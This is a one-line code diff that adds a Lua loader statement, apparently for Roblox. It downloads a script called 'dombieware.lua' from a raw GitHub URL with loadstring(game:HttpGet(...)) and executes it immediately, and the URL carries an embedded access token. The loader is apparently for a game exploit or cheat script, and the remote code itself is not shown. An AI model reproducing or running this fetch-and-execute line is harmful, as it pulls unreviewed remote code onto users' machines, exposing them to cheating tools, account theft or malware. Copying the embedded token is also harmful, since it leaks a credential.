@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LilBr0b3arCode/DombieWare/refs/heads/main/dombieware.lua?token=GHSAT0AAAAAAC2VTCXNMBXQT2LFSTWU33MKZ2SDJKA", true))()
